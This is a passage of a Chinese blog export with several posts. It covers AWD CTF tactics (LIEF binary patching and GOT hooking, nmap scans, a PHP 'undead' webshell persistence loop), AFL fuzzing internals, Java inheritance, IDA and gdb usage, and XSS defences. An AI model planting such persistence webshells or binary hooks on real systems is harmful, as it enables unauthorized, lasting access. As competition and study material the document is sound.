filter(lambda e: e.name == "system", libc.dynamic_symbols)[0]puts_sym.name = "system"system_sym.name = "puts"libc.write("libc.so.6") 修改目标文件的导入符号. 123456789import lief#支持ELF,PE,Mach-Opwn = lief.parse("pwn")puts_sym = filter(lambda e: e.name == "puts", pwn.imported_symbols)[0]puts_sym.name = "system"pwn.write("pwn.patch") 增加代码段. 12345678910111213import lief libc = lief.parse("/lib/x86_64-linux-gnu/libc-2.23.so")hook = lief.parse("hook") segment_added = libc.add(hook.segments[0]) exp_symbol = libc.get_symbol("exp")hook_symbol = hook.get_symbol("hook") exp_symbol.value = segment_added.virtual_address + hook_symbol.value libc.write("libc.so.6") 通过修改pltgot表直接劫持程序. 123456789101112import lief pwn = lief.parse("pwn")hook = lief.parse("hook") segment_added = pwn.add(hook.segments[0]) my_memcmp = hook.get_symbol("my_memcmp")my_memcmp_addr = segment_added.virtual_address + my_memcmp.value pwn.patch_pltgot('memcmp', my_memcmp_addr)pwn.write("pwn.hooked") 还有个思路是修改目标文件.eh_frame段. 在patch程序时要记得备份原来的漏洞程序,复制进去之后还需要给程序赋予相应的权限. Attack通过代码审计发现漏洞从而攻击别人的服务器.成功攻击后需要权限维持. 主机发现在同个C段或者B段时均可以使用扫描器进行扫描. 发现主机后进行端口扫描,可以使用nmap或者准备好的脚本. 1234nmap -sP 192.168.20.*#发现主机nmap -sT -p- -Pn 192.168.20.1-254#所有子网tcp扫描 权限维持可以利用预留后门维持权限,主要有不死马和反弹shell. 不死马也称内存马,删除掉木马之后,由于操作存于内存当中,还是会不断地生成木马,达到权限维持的目的. 12345678910111213&lt;?php set_time_limit(0); ignore_user_abort(true); $file = '.demo.php'; $shell = "&lt;?php phpinfo();?&gt;"; while(true)&#123; file_put_contents($file, $shell); system('chmod 777 .demo.php'); usleep(50); &#125;?&gt; 结束不死马的方法有杀死进程或重启服务. 流量与日志审计可以通过别人的payload获取漏洞思路从而进攻其他人. 攻击脚本比赛的过程中,绝大多数情况都是利用多线程批量化攻击脚本进行攻击.可以在赛前完成脚本框架,比赛时完善基本的函数即可.比赛中提交flag一般会带上队伍token和flag. 攻击过程可以分为flag获取,去重和提交;写好方法的单元测试和集成测试函数;做好异常处理;过滤输出. AWD工具awd-tools.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞挖掘-fuzz-AFL基础]]></title>
    <url>%2Fposts%2Fd71c55d%2F</url>
    <content type="text"><![CDATA[简介AFL是一种Fuzzing测试工具.通过对源码进行编译时插桩(通过注入探针代码来实现程序分析)的方式监测边界(代码)覆盖率,通过算法自动变异新的测试用例来探索二进制程序内部新的执行路径.AFL也支持直接对没有源码的二进制程序进行测试,但需要QEMU的支持. 原理AFL的一个特点就是基于边界覆盖率的反馈机制,边界覆盖率的统计工作通过插桩完成,然后通过边界覆盖率来进行状态分析.记录输入样本的代码覆盖率,从而调整输入样本以提高覆盖率,增加发现漏洞的概率. fuzz过程中AFL会维护一个语料库队列queue,包含了初始测试用例及变异后有新状态产生的测试用例,变异策略分为确定性策略和随机性策略. AFL通过跳转指令将程序分为一个个基本块,将源基本块和目的基本块的配对组合称为tuple(元组).通过记录tuple统计边界覆盖率,AFL通过bitmap(以byte为单位从而记录tuple的命中数)来记录这些信息.出现新tuple或已有tuple中出现的新命中组视为产生新状态(也意味着更新覆盖范围),相应的测试用例将被归入到语料库队列queue中. 上述过程会一直循环进行,期间触发了crash的文件会被记录下来. 插桩模块AFL有三种不同模式的插桩操作. 其中普通模式和llvm模式是针对目标程序提供源码的情况,相较汇编级的普通模式插桩,编译级的llvm模式插桩包含更多优化.对仅提供二进制文件的目标程序则需借助qemu模式,其性能最低. 这三种模式所插入的代码从用途上都包括: 记录目标程序执行过程中的tuple信息,在每个基本块上都有插入. 必要的初始操作以及维护一个forkserver循环启动进程. 普通模式gcc的-B prefix用于指定各阶段执行文件的优先查找目录.普通模式下AFL采用的插桩思路是先对gcc做一层简单封装,有一项是设定-B prefix选项并指向封装后的as汇编器所在目录. 123//afl-gcc.c,edit_params.cc_params[cc_par_cnt++] = "-B";cc_params[cc_par_cnt++] = as_path; 由封装后的as汇编器来处理前面生成的汇编文件,实际操作为查找汇编文件中的.text节区并在各控制转移指令处插入跳板trampoline_fmt_32／trampoline_fmt_64后再交由真正的as汇编器处理.分析可知跳板的作用是跳转到具体的实现部分main_payload_32／main_payload_64,此部分指令只会插入一次. 其中一个分支是用于记录目标程序执行过程中的tuple信息. 123456cur_location = &lt;COMPILE_TIME_RANDOM&gt;;//目的基本快位置,随机化生成.shared_mem[cur_location ^ prev_location]++;//记录tuple信息的bitmap.prev_location = cur_location &gt;&gt; 1;//新的源基本块位置,移位操作是为了保留元组的方向性. 另一分支进行初始操作并维护forkserver,它会将已经初始化好的目标进程暂停在某个地方(例如main函数入口).按需再fork出一个子进程交予fuzzer进行测试.forkserver和fuzzer间是通过pipe管道进行通信的,除了控制命令,fork成功后的PID以及waitpid返回状态都是借由此方式传递. llvm模式LLVM中代码首先由编译器前端clang处理后得到中间代码IR,再经过各pass工作节点的优化和转换,最终交给编译器后端生成机器码. AFL的插桩思路是通过编写pass来实现tuple信息的记录,在此过程中会对每一基本块都插入探针,具体代码在afl-llvm-pass.so.cc文件.而初始化和forkserver操作则通过链接完成,afl-llvm-rt.o.c文件实现了afl-as.h中main_payload的这部分功能. qemu模式对于该模式下的插桩,AFL的思路是直接利用QEMU内置的跟踪功能,并通过patch源码的方式来实现afl-as.h中的操作. fuzzer模块主要作用是通过不断改变测试用例来影响目标程序的执行路径,相关代码在afl-fuzz.c文件. 起始阶段fuzzer会进行一系列的准备工作,例如初始化bitmap,forkserver上线,与子进程的交互准备,目录处理与前期检测等. fuzzing策略AFL中用到的变异策略分为确定性策略和随机性策略. 对于各变异操作,基本的处理流程如下. 如果一个测试用例在执行完随机性策略后仍未产生新状态,则会将其与另一测试用例随机拼接后再次交由随机性策略处理.而在确定性策略fuzzing过程中,如果发现后续的变异操作已经在前面进行过了,为避免重复将会跳过该操作,如果没有重复则由common_fuzz_stuff函数将变异后的内容写入测试文件并运行目标程序. 变异的主要类型如下. bitflip,按位翻转,1变为0,0变为1. arithmetic,整数加减算术运算. interest,把一些特殊内容替换到原文件中. dictionary,把自动生成或用户提供的token替换/插入到原文件中. havoc,此阶段会对原文件进行大量变异. splice,此阶段会将两个文件拼接起来得到一个新的文件. 其中,前四项是非dumb mode(-d)和主fuzzer(-M)会进行的操作,由于其变异方式没有随机性,所以也称为deterministic fuzzing;havoc和splice则存在随机性,是所有状况的fuzzer都会执行的变异. bitflip最先使用的变异策略就是bitflip,根据翻转量/步长会进行多种不同的翻转,按照顺序依次为. bitflip 1/1,每次翻转1个bit,按照每1个bit的步长从头开始. bitflip 2/1,每次翻转相邻的2个bit,按照每1个bit的步长从头开始. bitflip 4/1,每次翻转相邻的4个bit,按照每1个bit的步长从头开始. bitflip 8/8,每次翻转相邻的8个bit,按照每8个bit的步长从头开始,即依次对每个byte做翻转. bitflip 16/8,每次翻转相邻的16个bit,按照每8个bit的步长从头开始,即依次对每个word做翻转. bitflip 32/8,每次翻转相邻的32个bit,按照每8个bit的步长从头开始,即依次对每个dword做翻转. 在上述过程中AFL巧妙地嵌入了一些对文件格式的启发式判断. 自动检测token:在进行bitflip 1/1变异时,对于每个byte的最低位翻转还进行了额外的处理:如果连续多个bytes的最低位被翻转后.程序的执行路径都未变化.而且与原始执行路径不一致,那么就把这一段连续的bytes判断是一条token.为了控制这样自动生成的token的大小和数量,AFL在config.h中通过宏定义限制. 1234#define MIN_AUTO_EXTRA 3#define MAX_AUTO_EXTRA 32#define USE_AUTO_EXTRAS 10#define MAX_AUTO_EXTRAS (USE_AUTO_EXTRAS * 10) 生成effector map:在进行bitflip 8/8变异时,AFL还生成了一个非常重要的信息:effector map.具体地,在对每个byte进行翻转时,如果其造成执行路径与原始路径不一致,就将该byte在effector map中标记为1,即有效的,否则标记为0. 如果一个byte完全翻转,都无法带来执行路径的变化,那么这个byte很有可能是属于data而非metadata,对整个fuzzing的意义不大. arithmetic在bitflip变异全部进行完成后,便进入arithmetic.arithmetic根据目标大小的不同,也分为了多个子阶段. arith 8/8,每次对8个bit进行加减运算,按照每8个bit的步长从头开始,即对文件的每个byte进行整数加减变异. arith 16/8,每次对16个bit进行加减运算,按照每8个bit的步长从头开始,即对文件的每个word进行整数加减变异. arith 32/8,每次对32个bit进行加减运算,按照每8个bit的步长从头开始,即对文件的每个dword进行整数加减变异. 加减变异的上限,在config.h中的宏ARITH_MAX定义,默认为35.所以,对目标整数会进行+1,...,+35,-1,...,-35的变异.由于多个字节的整数存在大端序和小端序两种表示方式,AFL对这两种整数表示方式都进行变异. AFL还会智能地跳过某些arithmetic变异.第一种情况就是前面提到的effector map:如果一个整数的所有bytes都被判断为无效,那么就跳过对整数的变异.第二种情况是之前bitflip已经生成过的变异此次便不会再执行. interest下一个阶段是interest,也分为了多个子阶段. interest 8/8,每次对8个bit替换,按照每8个bit的步长从头开始,即对文件的每个byte进行替换. interest 16/8,每次对16个bit进替换,按照每8个bit的步长从头开始,即对文件的每个word进行替换. interest 32/8,每次对32个bit进替换,按照每8个bit的步长从头开始,即对文件的每个dword进行替换. 用于替换的interesting values是AFL预设的一些比较特殊的数. 123static s8 interesting_8[] = &#123; INTERESTING_8 &#125;;static s16 interesting_16[] = &#123; INTERESTING_8, INTERESTING_16 &#125;;static s32 interesting_32[] = &#123; INTERESTING_8, INTERESTING_16, INTERESTING_32 &#125;; 这些数的定义在config.h文件中.基本都是可能会造成溢出的数.与之前类似,effector map仍然会用于判断是否需要变异;此外重复性变异也是会跳过的. dictionary进入到这个阶段,就接近deterministic fuzzing的尾声了,具体有以下子阶段. user extras (over),从头开始,将用户提供的tokens依次替换到原文件中. user extras (insert),从头开始,将用户提供的tokens依次插入到原文件中. auto extras (over),从头开始,将自动检测的tokens依次替换到原文件中. 用户提供的tokens是在词典文件中设置并通过-x选项指定的,如果没有则跳过相应的子阶段. havochavoc包含了对原文件的多轮变异,每一轮都是将多种方式组合stacked而成. 随机选取某个bit进行翻转. 随机选取某个byte/word/dword,将其设置为随机的interesting value. 随机选取某个byte/word/dword,并随机选取大/小端序,对其加/减去一个随机数. 随机选取某个byte,将其设置为随机数. 随机删除一段bytes. 随机选取一个位置,插入/替换一段随机长度的内容,其中75%的概率是插入原文中随机位置的内容,25%的概率是插入一段随机选取的数. 随机选取一个位置,用随机选取的token(用户提供的或自动生成的)替换/插入. AFL会生成一个随机数,作为变异组合的数量,并根据这个数量,每次从上面那些方式中随机选取一个,依次作用到文件上. splicesplice是将两个seed文件拼接得到新的文件,并对这个新文件继续执行havoc变异. 具体地,AFL在seed文件队列中随机选取一个,与当前的seed文件做对比.如果两者差别不大,就再重新随机选一个;如果两者相差比较明显,那么就随机选取一个位置,将两者都分割为头部和尾部.最后,将当前文件的头部与随机文件的尾部拼接起来,就得到了新的文件.在这里,AFL还会过滤掉拼接文件未发生变化的情况. cycle上面的变异完成后,AFL会对文件队列的下一个进行变异处理.当队列中的全部文件都变异测试后,就完成了一个cycle,整个队列又会从第一个文件开始,再次进行变异,不过与第一次变异不同的是,这一次就不需要再进行deterministic fuzzing了.如果用户不停止AFL,那么seed文件将会一遍遍的变异下去. 语料库更迭随着fuzzing的深入,目标程序会产生越来越多的执行路径,相应测试用例能否加入语料库queue队列取决于trace_bits(位于共享内存上,记录当前的tuple信息)是否出现新状态. fuzzer会通过virgin_bits来记录目标程序的总tuple信息,每个tuple对应一个字节,初始值为0xFF. 每个tuple都分为8个命中组,每个比特位可对应一个命中组,若无此类新状态出现其值仍为1,若出现其值则置0.执行完目标程序后要调用classify_counts函数对此次记录的各tuple命中数进行归组. 1234567891011static const u8 count_class_lookup8[256] = &#123; [0] = 0, [1] = 1, [2] = 2, [3] = 4, [4 ... 7] = 8, [8 ... 15] = 16, [16 ... 31] = 32, [32 ... 127] = 64, [128 ... 255] = 128&#125;; 只需将执行完归组操作后的trace_bits和virgin_bits做个比对就能判断出是否有新状态产生,同时,采用位运算也是为了提高代码执行的速率. 后续合成的一些测试用例的边覆盖可能是之前测试用例的代码覆盖的超集.为了优化fuzzing,AFL周期性的重新评估队列.使用一种快速算法选择仍然能覆盖每一个元组,但有更小的测试用例的子集. 算法通过指定每一个队列入口,根据执行延迟和文件大小分配一个分值比例.然后为每一个元组选择最低分值作为候选构造最小覆盖集.生成的favored entries的语料与初始数据集相比,在体积上通常要小5-10x倍.Non-favored entries将不会被丢弃,但当在队列中遇到的时候,它们会被不同的概率跳过. 如果在队列中有新的favored entries,99%的non-favored entries将被跳过. 如果没有新的favored entries,且当前non-favored entry是之前被fuzzed过得,它将被以95%的概率跳过. 如果没有新的favored entries,且当前non-favored entry没有通过任何fuzzing rounds,它将被以75%的概率跳过.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pl-java-继承]]></title>
    <url>%2Fposts%2F34d5826b%2F</url>
    <content type="text"><![CDATA[超类与子类is-a(是)关系是继承的一个明显特征.在Java中子类(也称派生类或孩子类)继承于超类(也称基类或父类),使用关键字extends(C++为:)表示继承. 对比C++,Java所有的继承都是公有继承,没有私有和保护继承. 子类会继承父类的方法和域,可以通过super.func()调用超类的方法(注意super并不是引用,只是告诉编译器这里要调用超类的方法,C++中使用超类名加上::操作符). 通过重新定义函数来覆盖超类的方法(注意需要参数类型,函数名一致,类似C++中虚函数的覆盖,也可以说Java方法默认为虚函数,如果不想被子类覆盖可使用final标记方法,或者直接标记类使类的方法自动变成final,不包括域). 超类引用可以引用子类对象,可以使用super(arg1, ...)调用超类的构造器(C++中使用初始化列表语法). 虚函数使一个对象变量可以在运行时能够自动地选择调用哪个方法,这种现象称为动态绑定.而一个对象变量可以指示多种实际类型的现象称为多态. 方法调用对于类X的对象x的方法调用x.f(args).调用过程如下. 编译器首先查看对象声明类型,方法名和方法参数类型等找到要调用的函数的函数签名. 如果为private方法,static方法,final方法或者构造器则此时就可以确定调用的方法.这种调用方式称为静态绑定. 如果不是,则从当前类开始,沿继承链向超类寻找这个方法调用.实际上Java虚拟机会为每一个类创建一个方法表(虚函数表)以供动态调用. 强制类型转换可以通过instanceof操作符查看是否能进行类型转换. 12345if (x instanceof Master)&#123; x2 = (Master) x; ...&#125; 实际上的类型转换只能在继承层次内发生,并且超类转换成子类之前需要使用instanceof检测(类似C++的dynamic_cast). 抽象类可以使用abstract声明抽象方法与抽象类,包含与一个或多个抽象方法的类本身必须被声明为抽象的. 抽象方法相当于一个占位符,其具体实现在子类中.抽象类不能被实例化.C++通过在类的一个成员函数声明尾部用= 0标记声明其为纯虚函数来声明这个类为抽象类. ObjectObject类为Java所有类的始祖,类声明时如果没有明确指出超类,则此类的超类为Object.(在Java中只有基本类型不是对象) Object提供了以下11个方法. 12345678910111213141516171819202122232425262728293031323334353637public final native Class&lt;?&gt; getClass()//getClass方法是一个final方法,并且也是一个native方法.//返回当前运行时对象的Class对象.public native int hashCode()//hashCode方法是一个native方法.//返回对象的哈希码,主要使用在哈希表中.//哈希码的通用约定如下:在同一java程序执行过程中,在一个对象没有被改变的前提下,hashCode方法都会返回相同的整数值;如果2个对象使用equals方法进行比较相同的话,那么这2个对象的hashCode的值也必须相等;如果equals方法得到两个对象不相等,不相等的对象的hashCode值不同的话可以提高哈希表的性能;public boolean equals(Object obj)//比较两个对象是否相等.Object类的默认实现,即比较2个对象的内存地址是否相等.//equals方法在非空对象引用上的特性://自反性,任何非空引用值x,对于x.equals(x)必须返回true;//对称性,任何非空引用值x和y,如果x.equals(y)为true,那么y.equals(x)也必须为true;//传递性,任何非空引用值x,y和z,如果x.equals(y)为true并且y.equals(z)为true,那么x.equals(z)也必定为true;//一致性,任何非空引用值x和y,多次调用x.equals(y)始终返回true或始终返回false,前提是对象equals比较中所用的信息没有被修改;//对于任何非空引用值x,x.equals(null)都应返回false;protected native Object clone() throws CloneNotSupportedException//clone方法是一个protected的native方法.//创建并返回当前对象的一份拷贝.一般情况下,对于任何对象x,表达式x.clone() != x为true,x.clone().getClass() == x.getClass()也为true.//由于Object本身没有实现Cloneable接口,所以不重写clone方法并且进行调用的话会发生CloneNotSupportedException异常.public String toString()//Object对象的默认实现,即输出类的名字@实例的哈希码的16进制.//建议Object所有的子类都重写这个方法.protected void finalize() throws Throwable &#123; &#125;//finalize方法是一个protected方法,Object类的默认实现是不进行任何操作.//该方法的作用是实例被垃圾回收器回收的时候触发的操作.类似C++的析构函数.public final native void notify()public final native void notifyAll()public final native void wait(long timeout) throws InterruptedExceptionpublic final void wait(long timeout, int nanos) throws InterruptedExceptionpublic final void wait() throws InterruptedException//都是关于线程的,后面再解释. 反射Java中通过反射库实现了一个反射机制,能够在运行时分析类的能力和查看对象,实现通用的数组操作代码,利用Method对象(类似C++的函数指针). Class类这是Java运行时为所有对象维护的一个保存类型信息的类Class.通过getClass()方法获得实例. 异常捕获类似C++的异常处理机制. 12345try &#123; //&#125; catch (Exception e) &#123; //&#125; 分析类反射机制能在运行时检查类的结构.通过java.lang.reflect包中的三个类Field,Method和Constructor来描述类的域,方法和构造器.对应接口为Class类中的getFields,getMethods,getConstructors,getDeclareFields,getDeclareMethods,getDeclareConstructors. 调用任意方法Java中没有提供函数指针之类的东西,但可以通过反射机制调用任意方法.Method类中有一个invoke方法允许调用包装在当前Method对象中的方法. 1Object invoke(Object obj, Object... args) 通过对应的Class类的getMethod方法获取对应的Method实例. 12Method a = Sample.Class.getMethod("getName", double.class)//第一个参数为方法名,后面为方法每个参数的参数类型 继承的设计技巧 将公共操作和域放到超类. 不要使用受保护的域. 使用继承实现is-a关系. 除非所有继承的方法都有意义,否则不要使用继承. 在覆盖方法时,不要改变预期的行为. 使用多态而非类型信息. 不要过多的使用反射.]]></content>
      <categories>
        <category>programming language</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-逆向分析-tool-IDA-基础]]></title>
    <url>%2Fposts%2F2ea578a9%2F</url>
    <content type="text"><![CDATA[反汇编IDA是一个反汇编工具,软件开发过程中,程序员使用编译器,汇编器和链接器来创建可执行程序.对应的可以使用反汇编器和反编译器来获得可执行程序的可阅读的代码. 但反编译会面临由于编译过程的损失,编译过程的多对多等问题.(反汇编由于是一对一,处理过程简单很多) 汇编语言源代码主要采用两种语法:AT&amp;T和Intel语法. 反汇编算法首先要确定代码区域,这需要知道对应可执行文件的文件格式从而找到代码段的起始地址,找到后读取进行查表找到其汇编语言助记符,这一步需要明晰当前指令集,然后解码后输出汇编代码.反复执行这些即可. 而如何选择下一条反汇编的指令,如何区分代码和数据,如何确定最后一条指令就因具体算法而异,其中最主要的有线性扫描和递归下降.IDA采用的是后者. 反汇编引擎ODDisasm,BeaEngine,Udis86,Capstone,AsmJit,Keystone等等. IDA目录组成 cfg:各种配置文件,例如基本配置文件ida.cfg,GUI配置文件idagui.cfg等. dbgsrv:远程debug使用的程序. idc:包含IDA内置脚本语言IDC所需的核心文件. ids:包含一些符号文件. loaders:包含在文件加载过程中用于识别和解析PE或ELF等已知文件格式的IDA扩展. plugins:包含专门为IDA提供附加功能的IDA模块. procs:包含已安装的IDA版本所支持的处理器模块,其为IDA提供机器语言到汇编语言的转换功能. sig:包含IDA在各种模式匹配操作中利用的现有代码的签名. til:包含一些类型库信息,记录特定于各种编译器库的数据结构的布局. 使用IDA通过执行loaders目录中的文件加载器对文件解析,如果IDA没能识别出文件格式,需要自行选择合适的处理器类型,加载段,加载偏移量.核心选项用于配置特定的反汇编分析选项.处理器选项用于配置处理器模块. IDA会将文件加载到内存,并对相关部分进行解析,同时IDA会创建一个数据库保存这些信息,数据库组件分别保存在四个文件中,分别为filename.id0,filename.id1,filename.nam,filename.til.关闭项目时这四个文件会被归档为一个IDB文件. 分析完成后就可以在IDA桌面环境对文件进行分析. IDA主要窗口有反汇编窗口,Names窗口,消息窗口,Strings窗口,另外还有hex窗口,导出窗口,导入窗口,函数窗口和结构体窗口等. 常用快捷键 f5:反汇编. f12:函数流程图. esc:在反汇编窗口会倒回上一部操作的视图,在其他窗口会关闭该窗口. shift + f12:打开string窗口. shift + e:导出数据. ctrl + f12:函数调用图. ctrl + w:保存ida数据库. ctrl + s:选择某个数据段,直接进行跳转. ctrl + shift + w:拍摄IDA快照. alt + k:修改栈指针更改的字节数. x:查看函数,变量的交叉引用. g:直接跳转到某地址. n:更改函数,变量的名称,输入空白则会变成默认名称. y:更改变量的类型. /:在反编译后伪代码的界面中写注释. \:在反编译后伪代码的界面中隐藏/显示变量和函数的类型描述. ;:在反汇编后的界面中写下注释. c:定义一段指令. p:定义一个子程序. d:数据类型切换(db,dw,dd). u:取消函数,代码,数据的定义. a:将数据转换为ASCII字符串. *:进行数组定义. 双击:跳转到地址. 数据设置 Options-&gt;Setup Data Types可以设置数据类型,同时右侧复选框可以设置数据转盘(d键循环数据转盘). Edit-&gt;Strings可以选择字符串类型,即以对应字符解析规则解析当前地址开始的字节. Edit-&gt;Array可以创建数组,创建的数组类型以选择创建处的变量类型决定. 识别与切换指令集Edit-&gt;Segments-&gt;Change segment register value(快捷键alt + g). 函数操作IDA支持新建,删除函数和函数块(指定义),Edit-&gt;Functions种有其支持的操作. 同时还支持编辑函数的属性:函数名,函数起始和结束地址,局部变量,保存的寄存器,已删除字节和栈指针增量等. FLIRTFast Library Identification and Recognition Technology(库文件快速识别与鉴定技术). IDA可以通过导入签名文件(Shift + F5,右键导入)进一步识别库函数.还可以利用FLIRT解析器(存放在bin目录)创建签名文件,具体可查阅文档. 可以通过lscan找到对应的签名库,首先python lscan.py -S amd64/sig -f ./demo,然后将对应签名库拷贝到IDA的sig/pc文件夹导入即可. 调试器IDA支持本地调试,Attach已有进程和远程调试等多种方式(支持IDC脚本自动化调试). 远程调试只需要利用dbgsrv下对应目标主机版本的程序,在目标主机运行该程序即可.程序支持-p &lt;port&gt;,默认23496;-P &lt;password&gt;,设置连接调试密码;-v设置为详细模式. PatchEdit -&gt; Patch program,然后选择修改方式即可,修改完成后Edit -&gt; Patch program -&gt; Apply ...保存到本地. 中文支持修改cfg/ida.cfg. 123456789// CULTURE=&quot;all&quot;;CULTURE=&quot;all&quot;NameChars = &quot;$?@&quot; &quot;_0123456789&quot; &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot; &quot;abcdefghijklmnopqrstuvwxyz&quot;, Culture_CJK_Unified_Ideographs, CURRENT_CULTURE; 常用插件 keypatch:用于patch二进制程序. idawasm:用于逆向webassembly代码. rizzo:通过签名识别函数. 插件仓库:https://github.com/devttys0/ida. 常见错误 sp-analysis failed:IDA解析的时候认为ESP的值是错误的.修正:Options-&gt;General-&gt;Stack pointer勾选,在leave这一行按快捷键ALT + K,修改其值为leave前方标志的其ESP偏移值.]]></content>
      <categories>
        <category>binary</category>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>IDA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web安全-XSS-防御]]></title>
    <url>%2Fposts%2F7aa50884%2F</url>
    <content type="text"><![CDATA[同源策略源是host,协议,端口的三元组. 同源策略(SOP)是Web应用程序的一种安全模型,用于控制网页中DOM之间的访问(只是模型,不是标准). 同源策略被广泛地应用在处理Web内容的各种客户端上,比如各大浏览器,Adobe的Flash/Acrobat等.不同的客户端对于同源策略的处理也并非完全一致. 例如在Java6,7中,如果两个域名解析到相同的IP,认为它们同源. 同源策略没有禁止脚本的执行,而是禁止读取HTTP回复(静态资源通常不受同源策略限制). SOP影响范围包括:普通的HTTP请求,XMLHttpRequest,XSLT,XBL. 如果两个页面使用的协议,端口,主机名都相同,则认为两个页面同源. 页面跨域的行为主要会分为三类(所有具有src属性的HTML标签都是可以跨域的). 跨域写,通常被允许(链接,重定向和表单提交,一些不常见的HTTP请求方法需要先发送预请求(preflight,例如OPTIONS)). 跨域嵌入,通常被允许(资源嵌入). 跨域读,通常被禁止. 禁止跨域写需要引入CSRF令牌,并且正确的配置同源策略,否则CSRF令牌本身也将被恶意网页读取. 禁止跨域读可以通过设置X-Frame-Options头来禁止该页面被嵌入到恶意页面中. 禁止跨域嵌入需要确保资源本身无法嵌入到各种跨域访问方式中.同时,使用CSRF令牌也可以有效避免被跨域嵌入. 这与浏览器沙箱的设计理念不谋而合:沙箱是一个受保护的环境,在这个环境中的脚本只能访问指定的资源. 跨源访问最好的方式是使用CORS,或者使用Window.postMessage(HTML5新增),JSONP. 相同主域名不同子域名下的页面,可以设置document.domain让它们同域. CSPContent Security Policy(CSP)内容安全策略,是一个附加的安全层,有助于检测并缓解某些类型的攻击,包括跨站脚本和数据注入攻击.CSP是在浏览器层面做的防护,和同源策略同一级别. 浏览器目前可以通过获取Header头来进行CSP配置,CSP规则举例:header(&quot;Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; https://lorexxar.cn;&quot;);. 指令参考. default-src:定义资源默认加载策略. connect-src:定义Ajax,WebSocket等加载策略. font-src:定义Font加载策略. frame-src:定义Frame加载策略. img-src:定义图片加载策略. media-src:定义&lt;audio&gt;,&lt;video&gt;等引用资源加载策略. object-src:定义&lt;applet&gt;,&lt;embed&gt;,&lt;object&gt;等引用资源加载策略. script-src:定义JS加载策略. style-src:定义CSS加载策略. sandbox:值为allow-forms,对资源启用sandbox. report-uri:值为/report-uri,提交日志. 使用在线生成CSP规则的站点来辅助编写:http://cspisawesome.com/ HttpOnly浏览器会禁止JavaScript访问带有HttpOnly属性的Cookie. 一个Cookie使用过程如下. 浏览器向服务器发送请求(此时无Cookie). 服务器返回时发送Set-Cookie头,向客户端写入Cookie. 浏览器访问时携带Cookie(在Cookie到期之前). HttpOnly在Set-Cookie时标记. XSS Filter一般采用输入格式限制+黑名单,过于严格的过滤可能会曲解用户原来的意思. 格式限制可以包括:限制为输入内容为合法字符,限制输入长度等. 输入过滤在处理输入时,来自用户的UGC信息,来自第三方的链接,URL参数,POST参数,Referer(可能来自不可信的来源),Cookie(可能来自其他子域注入)都不可信. 对于链接跳转,如&lt;a href=&quot;xxx&quot; 或 location.href=&quot;xxx&quot;,要检验其内容,禁止以javascript:(包括jAvascript:,%20javascript:)开头的链接,和其他非法的scheme. 输出过滤通过编码函数对输出进行编码从而预防XSS.恶意代码被转义,不再被浏览器执行. 针对不同代码有不同的编码方式,针对HTML代码的编码方式是HtmlEncode,对应函数escapeHTML.PHP中的函数实现有htmlentities()和htmlspecialchars(). 其本质是转换部分特殊字符,例如htmlspecialchars:&amp; -&gt; &amp;amp,&lt; -&gt; &amp;lt,&quot; =&gt; &amp;quot,&#39; =&gt; &amp;#039,&gt; =&gt; &amp;gt. 最后还可以加上黑名单的过滤方法. ClickJacking防御使用frame busting. 123if (top.location != location) &#123; top.location = location;&#125; 使用HTTP头X-Frame-Options,有三个值可选. DENY:拒绝加载任何frame页面. SAMEORIGIN:frame页面的地址只能为同源域名下的地址. ALLOW-FROM:用于定义允许frame加载的地址. 其他输入内容长度控制,使用验证码,避免拼接HTML. 避免内联事件,尽量不要使用onLoad=&quot;onload(&#39;&#39;)&quot;,onClick=&quot;go(&#39;&#39;)&quot;这种拼接内联事件的写法,而是在JavaScript中通过.addEventlistener()绑定事件.]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-逆向分析-tool-gdb]]></title>
    <url>%2Fposts%2Fb3e257f0%2F</url>
    <content type="text"><![CDATA[启动方式调试可执行文件. 1$gdb &lt;path&gt; 调试core文件(程序非法执行后core dump后产生). 1$gdb &lt;path&gt; &lt;core path&gt; 调试服务程序. 1$gdb &lt;path&gt; &lt;PID&gt; 可以看出可执行文件本身是调试必须.其中服务的path可以在PATH环境变量中搜索得到. 使用gdb使用交互模式,通过命令完成对程序的调试.交互模式下直接回车的作用是重复上一指令. 运行指令 run(r):运行程序到断点或程序结束. continue(c):继续运行程序到断点或程序结束. next(n):单步步过. step(s):单步步入.(与next区别为遇到函数调用是否进入函数体调试) until:运行程序直到退出循环体. until + n:运行程序至n行.(不仅仅用来跳出循环) finish:运行程序到当前函数返回,并打印函数返回时的堆栈地址和返回值及参数值等信息. 断点指令 break n(b n):在第n行处设置断点.(有源代码的情况可以带上代码路径和代码名称:b OAGUPDATE.cpp:578) break func:在函数func的入口处设置断点. b fn1 if a&gt;b:条件断点设置. delete n:删除断点号为n的断点. delete breakpoints:清除所有断点. disable n:暂停断点号为n的断点. enable n:开启断点号为n的断点 clear n:清除第n行的断点. info b(info breakpoints):显示程序的断点设置. 信息指令 list(l):显示程序源代码.(默认10行,继续输入list会接着上次显示源代码) list n:显示以第n行为中心的10行代码. list func:显示函数func的源代码. print expr(p):expr可以是任何当前程序的有效表达式. display expr:在每次单步进行指令后输出被设置的表达式及值. watch expr:设置监视点,一旦被监视的expr的值改变,gdb将强行终止正在被调试的程序. whatis:查询变量或函数. info func:查询函数. i(info) frame:显示函数堆栈帧信息. info locals:显示当前堆栈页的所有变量. where/bt:当前堆栈列表. frame n:选择函数堆栈帧. bt backtrace:显示当前调用堆栈. up/down:向上或向下切换函数堆栈帧. info functions:列出可执行文件的所有函数名称,支持正则表达式,如info functions thre*. 窗口指令 layout src:显示源代码窗口. layout asm:显示反汇编窗口. layout split:显示源代码和反汇编窗口. layout regs:显示源代码/反汇编和CPU寄存器窗口. Ctrl + L:刷新窗口. 功能指令 set args:指定运行时的参数. show args:查看设置好的参数. info program:查看程序的是否运行,进程号,被暂停的原因. info registers:查看寄存器数值. call func(args):调用程序中可见的函数,等同于print func(args). 